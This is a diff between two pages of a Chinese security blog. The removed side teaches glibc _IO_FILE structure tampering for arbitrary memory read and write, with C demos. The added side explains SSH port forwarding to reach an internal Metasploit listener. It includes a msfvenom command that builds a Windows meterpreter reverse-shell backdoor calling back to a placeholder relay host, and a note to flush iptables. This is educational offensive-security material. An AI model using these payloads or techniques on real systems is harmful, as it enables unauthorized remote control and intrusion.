@@ -46,7 +46,7 @@
     
     <title>
         
-            Pwn with File结构体（二） | 
+            ssh转发至内网msf | 
         
         穷则变，变则通，通则久
     </title>
@@ -58,7 +58,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="hac425">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content=",file struct">
+    <meta name="keywords" content=",ssh端口转发">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -240,18 +240,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://blog.hac425.top">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Pwn with File结构体（二） | 穷则变，变则通，通则久">
+    <meta property="og:title" content="ssh转发至内网msf | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="file struct"> 
+    <meta property="og:article:tag" content="ssh端口转发"> 
 
     
-        <meta property="article:published_time" content="Thu Dec 07 2017 21:36:00 GMT+0800" />
-        <meta property="article:modified_time" content="Sat Jan 13 2018 15:46:23 GMT+0800" />
+        <meta property="article:published_time" content="Sun Jan 28 2018 16:34:00 GMT+0800" />
+        <meta property="article:modified_time" content="Sun Jan 28 2018 16:48:22 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="Pwn with File结构体（二） | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="ssh转发至内网msf | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -259,7 +259,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html" />
+        <link rel="canonical" href="http://blog.hac425.top/2018/01/28/ssh_to_msf.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -271,10 +271,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html",
-    "headline": "Pwn with File结构体（二）",
-    "datePublished": "Thu Dec 07 2017 21:36:00 GMT+0800",
-    "dateModified": "Sat Jan 13 2018 15:46:23 GMT+0800",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/01/28/ssh_to_msf.html",
+    "headline": "ssh转发至内网msf",
+    "datePublished": "Sun Jan 28 2018 16:34:00 GMT+0800",
+    "dateModified": "Sun Jan 28 2018 16:48:22 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "hac425",
@@ -292,7 +292,7 @@
             "url": "/img/girl.png"
         }
     },
-    "keywords": ",file struct",
+    "keywords": ",ssh端口转发",
     "description": "",
 }
 </script>
@@ -399,7 +399,7 @@
         
     
             <p class="article-headline-p">
-                Pwn with File结构体（二）
+                ssh转发至内网msf
             </p>
         </div>
 
@@ -418,7 +418,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>hac425</strong>
-        <span>12月 07, 2017</span>
+        <span>1月 28, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -440,7 +440,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACUUlEQVR42u3aQVLEMAwEwPz/0/CCDSPJdlJL50QtW0GdQyTGun6++rrw8PDw8PDw8PBexrviK7p18P1P3/n0SbU2PDw8vDO8pOj7QqulJMhebXh4eHgnefel3JOS4nJ2rzY8PDy8N/PuX9CTJoGHh4f3H3i9cCG/Mx4eHt6beck//PeBQv7bnHQ0a8HDw8OLedXx9+TPR8/38PDw8AJeeaUpXiyojsj5gsLGnTI8PDy8gJe/iJNYoQfoNQY8PDy8Z3nVYTqJcavtZB4E4+Hh4Z3nVUfhvJT80ST3bzYGPDw8vA28tcP0jsOzLSk1Hh4eXotXXXXKX/2rIt3CiI+Hh4f3Al41Gqhek5WsBY0BDw8Pb8DrNYBeRDtZWWg2Bjw8PLxFvOoh1tpP8ofSXB3Aw8PD28Drjb/5kF09ZkvG9D9qwMPDwzvCS5pBr3nkoW1+tDY6AMPDw8NbxKse5OekahDcC5Tx8PDwzvOqo20Suc5bQnNNAQ8PD28zLzlw6r3cq8jqaI6Hh4f3FG+ynDoftfPYN3lweHh4eOd5eSnV4vJjrV68i4eHh/cUrxfdVuOMJAoZjfh4eHh4j/Kq8Wt1TF/VhPDw8PBO8qpXr1XkzaC3toWHh4d3kjePG/Klq2q5W3bK8PDw8Bbx8mYwgVXj2mWNAQ8PD28bb/KCTo67eo+vegyGh4eH905eHihMSm+GyHh4eHiv501WB5J4N78DHh4e3nle79Br7dJV3hjw8PDwnuX1ht3kz/fuUw2F8fDw8E7yvu/Cw8PDw8PDw8N7wfULxbVItKVOUtAAAAAASUVORK5CYII=">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACY0lEQVR42u3aQW7DMAwEwPz/0+0D0ipL0paMYHQyECfW+CAyK71+vnq88PDw8PDw8PDwHsZ7xeP9/vffeb/+4/HBL/TmhoeHh7eT92Gp/YdXneiamn/rw7Pw8PDwNvLWxSBZ4tffTa7nc8PDw8N7Gi8pDEmLnJQHPDw8vO/gJa1w784H1T08PDy8S8OI3oR6v38ga8HDw8OLedUNsJ3XB/b38PDw8Ja86qgu93mDXi1C/z4XDw8P72Zesn1V3ejqbXHlQfCHUBgPDw/vZl4etk6me9VRrXKMi4eHh3cbr4rJj09N7my+FDw8PLwtvLwwzCOGpHEfHXLFw8PDO8rL44lJ850XgIsLAx4eHt6Yd+1mf69l70USeHh4eE/gVdvc6nH/3tZa9Cw8PDy8m3n5n/+k+c6PBfRiCDw8PLwn8JKpTOLdSWNdDXDx8PDw9vDy2LRaJHolJ4mPCzEuHh4e3g283qLc29qvbmvdUvfw8PDwLuo5kyZ7ErAWooS4JODh4eE9gVdtjqstdf4S880zPDw8vLO8asyalJb800LTvG7c8fDw8G7m9TDrBboH67XdeHh4eKd4hYZ1XBKqhwbyMoaHh4e3h5f/+e8t69UXlww8PDy8s7zqqG6YXQVIDoHh4eHh7eFVH5kXjGrLPjneioeHh7eflxeDq/C9wlCOcfHw8PBu5q0n12xwiyFFtTgVCgMeHh7eIV5+NGoSUkzCETw8PLxn8qrRQ/I6JuUHDw8P7xSvt+mVt+DJU9Yh76gw4OHh4V3KqwYB69JSXfTnJDw8PLydvO8beHh4eHh4eHh4Dxi/F+C6lr8fQDQAAAAASUVORK5CYII=">
     
 </ul>
 
@@ -454,7 +454,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/file-struct/">file struct</a>
+        <a class="post_tag-link" href="/tags/ssh端口转发/">ssh端口转发</a>
     </ul>
     
 
@@ -481,7 +481,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Pwn with File结构体（二）&url=http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=ssh转发至内网msf&url=http://blog.hac425.top/2018/01/28/ssh_to_msf.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -490,7 +490,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Pwn with File结构体（二）&url=http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html&via=hac425" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=ssh转发至内网msf&url=http://blog.hac425.top/2018/01/28/ssh_to_msf.html&via=hac425" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -499,7 +499,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/01/28/ssh_to_msf.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -508,7 +508,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/01/28/ssh_to_msf.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -532,30 +532,18 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
-<hr>
-<p>最新版的 <code>libc</code> 中会对 <code>vtable</code> 检查，所以之前的攻击方式，告一段落。下面介绍一种，通过修改 <code>_IO_FILE</code> 实现任意地址读和任意地址写的方式。</p>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><code>_IO_FILE</code> 通过这些指针，来读写数据。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512654157088d9edyn3q.png?imageslim" alt="paste image"><br>如果我们修改了它们，然后通过一些文件读写函数时，我们就能实现 任意地址读写。</p>
-<p> <strong>任意地址读</strong></p>
-<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512656021050j3vjc54v.png?imageslim" alt="paste image"></p>
-<p> 代码示例<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char *msg = &quot;hello_file&quot;;</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line">    read(0, buf, 100);</div><div class="line">    fp = fopen(&quot;key.txt&quot;, &quot;rw&quot;);</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~8;</div><div class="line">    fp-&gt;_flags |= 0x800;</div><div class="line"></div><div class="line">    // _IO_write_base write数据的起始地址， _IO_write_ptr  write数据的终止地址</div><div class="line">    fp-&gt;_IO_write_base = msg;</div><div class="line">    fp-&gt;_IO_write_ptr = msg + 6;</div><div class="line"></div><div class="line">    //绕过检查</div><div class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</div><div class="line"></div><div class="line">    // write 的目的 文件描述符， 1 --&gt; 标准输出</div><div class="line">    fp-&gt;_fileno = 1;</div><div class="line">    fwrite(buf, 1, 100, fp);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512656917401bhu6ayhp.png?imageslim" alt="paste image"></p>
-<p>  <strong>任意地址写</strong></p>
-<p>  <img src="http://oy9h5q2k4.bkt.clouddn.com/15126569407780y6n1s1m.png?imageslim" alt="paste image"></p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">  #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char msg[100];</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line">    fp = fopen(&quot;key.txt&quot;, &quot;rw&quot;);</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~4;</div><div class="line"></div><div class="line">    // _IO_buf_base buffer 的起始地址， _IO_buf_end  buffer 的终止地址</div><div class="line">    // fread 先把数据读入 [_IO_buf_base, _IO_buf_end] 形成的 buffer</div><div class="line">    // 然后复制到目的 buffer</div><div class="line">    fp-&gt;_IO_buf_base = msg;</div><div class="line">    fp-&gt;_IO_buf_end = msg + 100;</div><div class="line"></div><div class="line">    // 设置 文件描述符， 0---&gt; stdin, 从标准输入读数据</div><div class="line">    fp-&gt;_fileno = 0;</div><div class="line">    fread(buf, 1, 6, fp);</div><div class="line">    </div><div class="line">    puts(msg);</div><div class="line">    puts(buf);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>  <img src="http://oy9h5q2k4.bkt.clouddn.com/1512657551566q5ox73ro.png?imageslim" alt="paste image"></p>
-<p> <strong>利用 stdin / stdout 任意地址写/ 读</strong></p>
-<p><code>puts</code>, <code>scanf</code> 等一批系统函数默认使用的 <code>stdin</code> , <code>stdout</code> ,<code>stderr</code> 等结构体进行操作，通过修改这些结构体的内容，可以更方便的实现任意地址读，任意地址写。</p>
-<p> <code>stdin</code> 也是 <code>_IO_FILE</code> 结构体<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line"></div><div class="line">int global_val = 0xaabbccdd;</div><div class="line"></div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    int var;</div><div class="line"></div><div class="line">    fp = stdin;</div><div class="line"></div><div class="line">    fp-&gt;_flags &amp;= ~4;</div><div class="line"></div><div class="line">    fp-&gt;_IO_buf_base = stdout;</div><div class="line">    fp-&gt;_IO_buf_end = stdout + 100;</div><div class="line"></div><div class="line"></div><div class="line">    scanf(&quot;%d&quot;,&amp;var);</div><div class="line">    </div><div class="line">    printf(&quot;0x%x\n&quot;, global_val);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p> 运行之<br> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512658393494amnz5255.png?imageslim" alt="paste image"></p>
-<p> 成功修改 <code>stdout</code> 结构体</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char *msg = &quot;hello_stdout&quot;;</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line"></div><div class="line">    fp = stdout;</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~8;</div><div class="line">    fp-&gt;_flags |= 0x800;</div><div class="line"></div><div class="line">    // _IO_write_base write数据的起始地址， _IO_write_ptr  write数据的终止地址</div><div class="line">    fp-&gt;_IO_write_base = msg;</div><div class="line">    fp-&gt;_IO_write_ptr = msg + 12;</div><div class="line"></div><div class="line">    //绕过检查</div><div class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</div><div class="line"></div><div class="line">    // write 的目的 文件描述符， 1 --&gt; 标准输出</div><div class="line">    fp-&gt;_fileno = 1;</div><div class="line">    puts(&quot;&lt;-----&gt;this is append on msg &quot;);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/15126587803351zrlnl5p.png?imageslim" alt="paste image"></p>
-<p> 成功读到了， <code>msg</code> 的内容。</p>
-<p> 参考：</p>
-<p> <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="external">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>买了个便宜的 <code>vps</code> , 在上面装 <code>msf</code> 也装不上，于是想着把端口映射到内网来。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拓扑如下：</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15171288094759demmuh7.png?imageslim" alt="paste image"></p>
+<p>首先在内网主机 <code>B</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -fCNR 7281:localhost:5000 root@C_IP</div></pre></td></tr></table></figure>
+<p>然后然后在 公网中转服务器 <code>C</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -fCNL *:5586:localhost:7281 localhost</div></pre></td></tr></table></figure>
+<p>此时端口转发完成</p>
+<p>连接  <code>C_IP:5586</code>  就是连接  <code>B_IP:5000</code></p>
+<p>然后使用 <code>msf</code> 生成后门，反弹到 <code>C_IP:5586</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=C_IP LPORT=5586 -f exe &gt; /data/test.exe</div></pre></td></tr></table></figure></p>
+<p>运行，数据流如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A --&gt; C_IP:5586 ---&gt; B_IP:5000</div></pre></td></tr></table></figure></p>
+<p><code>vultr</code>默认开启了 <code>iptables</code> 先 <code>iptables -F</code> 清理才能访问端口。</p>
 
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
@@ -564,7 +552,7 @@
                             <a>本站文章均原创， 转载注明来源</a>
                         </strong>
                         <br>
-                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html">http://blog.hac425.top/2017/12/07/pwn_with_file_part2.html</a>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/01/28/ssh_to_msf.html">http://blog.hac425.top/2018/01/28/ssh_to_msf.html</a>
                     </p>
                 </blockquote>
         
@@ -614,21 +602,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2017/12/12/pwn_with_file_part3.html" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2017/12/07/pwn_with_file_part1.html" id="post_nav-older" class="next-content">
+        <a href="/2018/01/17/learn_unicorn.html" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
